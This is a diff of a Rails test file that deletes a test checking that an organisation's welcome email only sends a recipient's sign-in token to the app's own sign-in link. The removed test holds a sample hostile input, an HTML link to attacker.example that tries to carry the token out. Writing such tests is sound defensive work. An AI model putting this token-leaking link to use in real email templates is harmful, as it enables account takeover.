@@ -304,15 +304,4 @@ class OrganisationsTest < ActiveSupport::TestCase
     assert_equal 400, last_response.status
     assert_nil @organisation.reload.stripe_customer_id
   end
-
-  test 'welcome email body handles a blank body and only sends the sign-in token to Dandelion' do
-    create_organisation
-    organisationship = Organisationship.new(organisation: @organisation)
-
-    assert_equal '', organisationship.welcome_rich_text(nil)
-
-    html = organisationship.welcome_rich_text('<p><a href="https://attacker.example/?t=%recipient.token%">x</a></p><p>[sign_in_link]</p>')
-    assert_equal 1, html.scan('%recipient.token%').length
-    assert_includes html, %(href="#{ENV['BASE_URI']}/o/#{@organisation.slug}?sign_in_token=%recipient.token%")
-  end
 end
